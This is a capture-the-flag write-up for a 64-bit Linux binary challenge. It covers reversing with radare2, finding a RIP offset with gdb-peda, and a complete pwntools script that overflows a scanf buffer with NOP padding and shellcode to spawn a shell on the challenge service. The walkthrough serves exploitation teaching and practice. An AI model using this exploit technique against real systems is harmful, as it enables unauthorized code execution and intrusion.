# Pwn 20: command line

**Description:**

Exploit this service and gain shell access to gain profit
(No ASLR)

`nc bitsctf.bits-quark.org 1330`


# Writeup

We get a file [`pwn1`](files/pwn1), let's check some basic info about it with radare2 `r2 -c "iI" pwn1`:

![1](files/1.png?raw=true)

Basically a 64bit elf binary. Let's analyse it with `aaa`:

![2](files/2.png?raw=true)

Now we can "seek" to main `s main` and enter graph view mode `VV`:

![3](files/3.png?raw=true)

We get this nice representation of main:

![4](files/4.png?raw=true)

I've highlighted the basic parts of the function:

1. Prologue: prepare the stack with local variables. Radare seems to have located one single local variable.
2. Body: this is where the magic happens, it first prints the address of the buffer then it will ask for some input and put it in the buffer. Since scanf is reading an arbitrary length of string (`%s`) we can execute a buffer overflow.
3. Epilogue: clean up the stack and return zero as return code. Equivalant to `return 0;` in C.


What we need to do:

1. Create some shellcode
2. Control RIP to jump to the shellcode
3. Craft this in a payload and pwn the service

Let's make it executable `chmod +x pwn1` and fire up gdb with peda.

![5](files/5.png?raw=true)

We'll create a pattern of 40 (`pattern_create 40 40.txt`) and launch the program with that pattern as input (`r < 40.txt`). We get a segmentation fault. To get the offset to RIP register, we simply need to print the value of the stackpointer register (`x/w $rsp`) and use that value in `pattern_offset` command (`pattern_offset 0x44414128`):

![6](files/6.png?raw=true)

We got an offset and it is `24`!

Let's create our [exploit](files/exploit.py) with pwntools:

```
# Import all from pwntools
from pwn import *

# Set context to linux 64bit
context(os='linux', arch='amd64')

# Either local or remote
conn = process('/root/vm_shared/ctf/20_command_line/pwn1')
# conn = remote('bitsctf.bits-quark.org', 1330)

# Offset to RIP
offset = 24
log.info("Offset to buf: %i", offset)

# Get that buffer address
buff_addr = conn.recvline().strip()
log.info("Address is: %s", buff_addr)
buff_addr = int(buff_addr, 16)  # string to int

# Crafting some shellcode with pwntools
shellcode = asm(shellcraft.sh())
log.info("Shell size is: %i", len(shellcode))

# Payload time
log.info("Crafting payload...")
payload = "\x90" * offset + p64(buff_addr + offset + 8) + shellcode

# Pwning~
conn.sendline(payload)

# Get that shell
conn.interactive()

# Get out of there
conn.close()
```

Our payload basically looks like this:

```
| OFFSET TO RIP (24) | address of the shellcode | shellcode | 
```
We calculate the address of the shellcode by using the address of the buffer plus the offset plus 8. You might wonder where 8 came from, well don't forget that the jump address is a 64bit address which takes 8 bytes, we also need to add it!

![7](files/7.png?raw=true)

Got shell! Now we can `cat` the flag by editing the script to remote.
